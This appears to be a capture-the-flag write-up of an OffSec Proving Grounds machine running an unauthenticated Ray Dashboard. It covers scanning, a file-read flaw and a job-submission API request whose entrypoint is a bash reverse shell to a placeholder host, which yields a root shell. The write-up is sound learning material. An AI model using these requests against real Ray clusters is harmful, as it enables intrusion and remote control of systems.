@@ -1,0 +1,187 @@
+---
+
+title: CTF-200-06 (OffSec. Proving Grounds)
+image: /assets/writeups/trace9.jpg
+description: Write-up of CTF-200-06 Machine
+date: 2023-12-29 09:00:00 -3000
+categories: [proving grounds]
+tags: [ray dashboard, CVE, insecure input validation, linux]
+author: trace
+
+---
+
+
+
+## Enumeration:
+
+```bash
+nmap -sC -sV <IP>
+```
+
+```bash
+rustscan -a 
+```
+
+![rustscanresult.png](../../assets/writeups/2023-12-27-CTF-200-06/rustscanresult.png)
+
+quite a few ports open but it was just mainly port `22`, `9000`, & `52365`
+
+#### Port 52365:
+
+This had some `/log` file directory which had the same log as which i found later on in ray dashboard logs
+
+#### Port 9000:
+
+Port `9000` was running [Ray Dashboard](https://docs.ray.io/en/latest/ray-observability/getting-started.html) which is a web-based dashboard for monitoring and debugging Ray applications. The visual representation of the system state, allows users to track the performance of applications and troubleshoot issues.
+
+![port9000.png](../../assets/writeups/2023-12-27-CTF-200-06/port9000.png)
+
+then i visited `Logs` section of the dashboard in order to find something which can come in handy,
+
+```xml
+agent-424238335.err
+agent-424238335.out
+dashboard.err
+dashboard.log
+dashboard_agent.log
+debug_state.txt
+debug_state_gcs.txt
+events/
+gcs_server.err
+gcs_server.out
+job-driver-Bishop_Fox_00001.log
+log_monitor.err
+log_monitor.log
+monitor.err
+monitor.log
+monitor.out
+old/
+python-core-driver-01000000ffffffffffffffffffffffffffffffffffffffffffffffff_1425.log
+python-core-driver-02000000ffffffffffffffffffffffffffffffffffffffffffffffff_1713.log
+python-core-driver-03000000ffffffffffffffffffffffffffffffffffffffffffffffff_1645.log
+python-core-worker-63da3aaab00807e34fa09389d49d535de3a4dd09388cd9a002c59572_1728.log
+python-core-worker-e39c5ba7728abce11978e4c5f262510de64e0146e07583dbe6173bd4_3913.log
+python-core-worker-f003cfbbb1a3f94fbb9eecbe2f4f2ec41a4896c9587eae431f792661_1730.log
+raylet.err
+raylet.out
+runtime_env_agent.log
+runtime_env_setup-02000000.log
+worker-63da3aaab00807e34fa09389d49d535de3a4dd09388cd9a002c59572-ffffffff-1728.err
+worker-63da3aaab00807e34fa09389d49d535de3a4dd09388cd9a002c59572-ffffffff-1728.out
+worker-e39c5ba7728abce11978e4c5f262510de64e0146e07583dbe6173bd4-02000000-3913.err
+worker-e39c5ba7728abce11978e4c5f262510de64e0146e07583dbe6173bd4-02000000-3913.out
+worker-f003cfbbb1a3f94fbb9eecbe2f4f2ec41a4896c9587eae431f792661-ffffffff-1730.err
+worker-f003cfbbb1a3f94fbb9eecbe2f4f2ec41a4896c9587eae431f792661-ffffffff-1730.out
+```
+
+had tons of log files but i didn't find anything worth mentioning, so next I proceeded with looking for Potential Vulnerability in the Web Application running itself And I found it had [CVE-2023-48023,](https://nvd.nist.gov/vuln/detail/CVE-2023-48023) a remote code execution (RCE) vulnerability tied to missing authentication for a critical function; [CVE-2023-48022](https://www.cve.org/CVERecord?id=CVE-2023-48022), a server-side request forgery vulnerability in the Ray Dashboard API that enables RCE; and [CVE-2023-6021,](https://nvd.nist.gov/vuln/detail/CVE-2023-6021) an insecure input validation error that also enables a remote attacker to execute malicious code on an affected system.
+
+## Getting Root:
+
+An insecure input validation is present in the Ray Dashboard’s `/api/v0/logs/file` API endpoint. The endpoint accepts arbitrary filesystem paths and does not require authentication, only connectivity to the Ray Dashboard port (8265 by default). The vulnerability was exploited to obtain the SSH private key used by Ray to authenticate to all other nodes in the associated cluster.
+
+
+To trigger the vulnerability, a valid `node_id` value was required. A `node_id` could be obtained in the Cluster section of the Ray Dashboard web app in the ID column of the Node List section. In the figure below, the ID of the head node
+
+
+![nodefound.png](../../assets/writeups/2023-12-27-CTF-200-06/nodefound.png)
+
+I obtained the node ID calling the Dashboard API `/nodes?view=summary`, there's an easy way to do it do is just look at the dashboard and you will find it
+
+Once you have a valid `node_id` value included in the request, the Ray Dashboard API returns the content of any file accessible to the account the web application server is running as. For example, in response to a `curl` command, the API returns the content of the server’s `/etc/passwd` file, as you can see:
+
+![etcpasswd.png](../../assets/writeups/2023-12-27-CTF-200-06/etcpasswd.png)
+
+So, As stated in the blog post i mentioned above the researcher said that in a **typical AWS cloud install, one can find a bootstrap config file in the home directory of the ray user. This bootstrap config file contains various details such as the cluster settings, including the full filesystem path where an SSH key is stored.**
+
+but that's the not the case here unfortunately i was able to retrieve the user private ssh key since every user was set to nologin :shrug: idk why?! maybe there's some other way where they need people to get in via webshell or something but anyways
+
+
+
+I later on via this method got the `/usr/bin/python3 /opt/server-ml.py`
+
+```python
+import ray
+import time
+import os
+import fcntl
+import socket
+import struct
+
+
+def get_ip_addr(interface: str) -> str:
+    # took it from https://gist.github.com/EONRaider/3b7a8ca433538dc52b09099c0ea92745
+    """
+    Uses the Linux SIOCGIFADDR ioctl to find the IP address associated
+    with a network interface, given the name of that interface, e.g.
+    "eth0". Only works on GNU/Linux distributions.
+    Source: https://bit.ly/3dROGBN
+    Returns:
+        The IP address in quad-dotted notation of four decimal integers.
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packed_iface = struct.pack('256s', interface.encode('utf_8'))
+        packed_addr = fcntl.ioctl(sock.fileno(), 0x8915, packed_iface)[20:24]
+        return socket.inet_ntoa(packed_addr)
+    except Exception as e:
+        print(f"An exception occurred while trying to get the ip addr: {e}")
+        pass
+
+
+curr_ip_addr = get_ip_addr("ens160")
+#print(curr_ip_addr)
+
+if curr_ip_addr.startswith("172."):
+    # wait till it gets the correct ip addr
+    while not curr_ip_addr.startswith("192."):
+        curr_ip_addr = get_ip_addr("ens160")
+
+time.sleep(3)
+
+ray.init(dashboard_host="0.0.0.0", include_dashboard=True, dashboard_port=9000)
+
+# ray dashboard is tied to the script life-cycle:)
+while True:
+    time.sleep(1)
+```
+
+
+
+
+lol, i didn't find it that interesting so i just moved ahead with a different approach and try to get the root shell
+
+
+[Protect AI published a MetaSploit Framework module that exploits this technique along with their disclosure](https://github.com/protectai/ai-exploits/blob/main/ray/msfmodules/ray_job_rce.py), although they did not call out the lack of authentication as a vulnerability. Researcher Bryce Bearchell independently submitted two reports to Protect AI’s huntr platform (https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/ and https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/) during the same time period that Bishop Fox reported the issue directly to Anyscale. However, the reports were closed based on Anyscale’s position that the behavior is by design, and therefore should not be perceived as a vulnerability.
+
+
+The Ray Jobs Python SDK can also be used to execute code remotely without authentication. The arbitrary command execution is obtained by crafting a malicious Python script using the Ray API to submit a task and then calling this malicious script in the entrypoint parameter of the `JobSubmissionClient` object.
+Also, the Ray Client API – exposed on TCP port `10001` by default – was vulnerable to unauthenticated remote code execution via a very similar technique but sadly we don't have it so i dropped that idea and went ahead with the different approach,
+
+
+And this was pretty direct method of exploitation discovered is to submit arbitrary operating system commands for execution via the job submission API using a raw HTTP request or the Ray Jobs Python SDK. These do not require authentication in the default configuration, and are accessible remotely to any system with access to the Ray Dashboard (TCP port 8265 by default).
+
+
+So now we craft a JSON job submission to execute the Linux shell command to get a reverse shell using `bash -i >& /dev/tcp/your_ip/your_port 0>&1`, sending the malicious JSON file to the jobs API, and then retrieving the output of the executed command like this:
+
+![reverseshelljson.png](../../assets/writeups/2023-12-27-CTF-200-06/reverseshelljson.png)
+
+> cat_passwd.json:
+
+```json
+{
+  "entrypoint": "bash -c 'bash -i >& /dev/tcp/your_ip/your_port 0>&1'",
+  "submission_id": "wtf",
+  "runtime_env": {},
+  "metadata": {},
+  "entrypoint_num_cpus": 1,
+  "entrypoint_num_gpus": 0,
+  "entrypoint_resources": {}
+}
+```
+
+and then we get a callback and we manage to pop a shell as root user
+
+![gotrootshell.png](../../assets/writeups/2023-12-27-CTF-200-06/gotrootshell.png)
+
+
